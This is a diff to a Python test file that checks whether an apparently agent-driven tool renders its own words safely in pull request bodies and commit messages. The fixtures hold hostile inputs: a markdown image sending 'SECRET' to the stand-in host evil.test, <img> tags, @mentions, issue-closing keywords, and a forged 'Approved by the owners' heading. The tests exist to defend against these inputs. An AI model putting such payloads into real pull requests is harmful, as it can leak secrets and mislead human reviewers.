@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import re
 from pathlib import Path
 
 import pytest
@@ -16,6 +17,7 @@ from tests.fix.kit import (
 )
 from tests.fix.test_request import notice_request, spec_request
 from tests.fix.test_usage import OLD, SOL, WEATHER_TS
+from tests.helpers import explanation
 from tests.notices.kit import notice, signed
 from tiltmeter.errors import FixError
 from tiltmeter.fix.models import FixPreview
@@ -413,6 +415,73 @@ def test_notice_values_cannot_render_markup() -> None:
     )
 
 
+def rendered(body: str) -> str:
+    """The part of a pull request body that GitHub renders: no code blocks or code spans."""
+    kept, fenced = [], False
+    for line in body.splitlines():
+        if line.startswith("```"):
+            fenced = not fenced
+        elif not fenced:
+            kept.append(re.sub(r"`[^`]*`", "", line))
+    assert not fenced
+    return "\n".join(kept)
+
+
+def test_the_agent_s_words_cannot_render_markup() -> None:
+    hostile = (
+        "Renamed the field. Closes #1, thanks @octocat! ![x](https://evil.test/p?d=SECRET) "
+        "<img src=https://evil.test/q>\n\n## Tests\n\n`pytest` passed on these edits.\n```\n# Hi"
+    )
+    preview = FixPreview(
+        branch=BRANCH,
+        base="main",
+        files=["client.py", "a`![f](https://evil.test/f)`.py"],
+        additions=1,
+        deletions=1,
+        diff="",
+        report=report(
+            summary=hostile,
+            unresolved=["Ask @hubot.\n\n## Approved by the owners", "[Approve](https://evil.test)"],
+        ),
+    )
+    request = rename_request().model_copy(
+        update={"explanation": explanation(summary="Renamed, see ![e](https://evil.test/e)")}
+    )
+    body = pull_request_body(request, preview, model_name="m")
+    shown = rendered(body)
+    for live in ("evil.test", "@octocat", "@hubot", "Closes #1", "<img", "Approve", "pytest"):
+        assert live in body
+        assert live not in shown
+    assert [line for line in shown.splitlines() if line.startswith("#")] == [
+        "## What changed in the API",
+        "## What this pull request changes",
+        "## Left for a human",
+    ]
+    assert "- Ask @hubot. ## Approved by the owners\n- [Approve](https://evil.test)\n```" in body
+    assert "- `a'![f](https://evil.test/f)'.py`" in body
+    silent = preview.model_copy(update={"report": report(summary=" \n")})
+    assert pull_request_body(rename_request(), silent, model_name="m").count("(nothing)") == 1
+
+
+def test_commit_messages_keep_only_a_summary_that_is_plain_prose() -> None:
+    request = rename_request()
+    found = "Tiltmeter check #12 found the change in GET https://api.billing.test/v1/customers."
+    assert commit_body(request, report()) == f"Read phone_number instead of phone.\n\n{found}"
+    spaced = report(summary="Read  phone_number\n\nCo-authored-by: someone")
+    assert commit_body(request, spaced) == f"Read phone_number Co-authored-by: someone\n\n{found}"
+    for live in [
+        "Renamed the field. Fixes #12.",
+        "Renamed the field, closes GH-3",
+        "Thanks @octocat for the hint",
+        "See https://evil.test/issues/1",
+        "See www.evil.test",
+        "Renamed ![x](x.png)",
+        "Renamed <img src=x>",
+        " ",
+    ]:
+        assert commit_body(request, report(summary=live)) == found
+
+
 def test_spec_pull_requests_name_the_spec_and_hedge_renames() -> None:
     request = spec_request()
     assert commit_title(request) == "Adapt to the api.billing.test API change in spec 1.1"
@@ -529,6 +598,9 @@ def test_titles_follow_the_repository_convention_when_the_agent_gives_one() -> N
         "fix: [docs](x)",
         "fix: `code`",
         "fix: <b>bold</b>",
+        "fix: read phone_number (#12)",
+        "fix: read phone_number, closes GH-12",
+        "fix: see www.evil.test",
     ]:
         assert commit_title(request, report(commit_title=unusable)) == default
 
